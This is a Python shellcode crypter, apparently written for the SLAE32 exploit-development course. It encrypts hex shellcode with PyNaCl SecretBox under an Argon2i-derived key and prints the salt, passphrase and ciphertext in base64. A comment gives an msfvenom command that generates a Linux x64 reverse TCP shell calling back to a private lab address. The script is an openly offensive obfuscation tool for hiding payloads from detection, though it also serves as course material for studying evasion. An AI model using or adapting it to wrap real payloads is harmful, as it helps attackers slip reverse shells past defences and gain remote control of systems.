#!/usr/bin/env python3

import sys
import base64
import nacl.secret
import nacl.utils
import nacl.pwhash


def generate_sym_key(passphrase, salt):
    # Encode passphrase
    passphrase = passphrase.encode("utf-8")

    # Key Derivation Function
    kdf = nacl.pwhash.argon2i.kdf

    # Symmetric key generation
    try:
        key = kdf(nacl.secret.SecretBox.KEY_SIZE, passphrase, salt)
    except Exception as ex:
        print("[!] ERROR. An exception occurred while generating the symmetric key")
        print(ex)
        sys.exit(1)

    # Convert the key to hex
    hexed_key = key.hex()

    return hexed_key


def encrypt(shellcode, key):

    # SecretBox for encrpytion
    box = nacl.secret.SecretBox(bytes.fromhex(key))

    try:
        # Encode the hex string shellcode
        shellcode = shellcode.encode("utf-8")

        # Encryption
        enc_shellcode = box.encrypt(shellcode)

        # Check encrypted shellcode length, which should be exactly 40 bytes larger
        # than the original one auth info and nonce have been added to it
        assert len(enc_shellcode) == len(shellcode) + box.NONCE_SIZE + box.MACBYTES

        # Base64 encode the encrypted shellcode so that it can be printed to screen
        enc_shellcode_b64 = base64.b64encode(enc_shellcode).decode("utf-8")

    except Exception as ex:
        print("[!] ERROR. An exception occurred during encryption")
        print(ex)
        sys.exit(1)

    return enc_shellcode_b64


if __name__ == "__main__":
    hex_shellcode = ""

    # Reading hex encoded shellcode from file
    # msfvenom -p linux/x64/shell_reverse_tcp \
    # LHOST=192.168.56.101 LPORT=7001 -f hex -o shellcode.txt
    try:
        sc_file = open("shellcode.txt", "r")
        hex_shellcode = sc_file.read()
        sc_file.close()
    except Exception as e:
        print("[!]ERROR. Could not read shellcode from file")
        print(e)
        sys.exit(1)

    passphrase = "SLAE32"
    salt_size = nacl.pwhash.argon2i.SALTBYTES
    salt = nacl.utils.random(salt_size)

    # Write
    key = generate_sym_key(passphrase, salt)
    enc_shellcode_b64 = encrypt(hex_shellcode, key)

    # Base64 encoding
    pph_b64 = base64.b64encode(passphrase.encode()).decode()
    slt_b64 = base64.b64encode(salt).decode()

    print("Encrypted payload:")
    print("%s.%s.%s" % (slt_b64, pph_b64, enc_shellcode_b64))
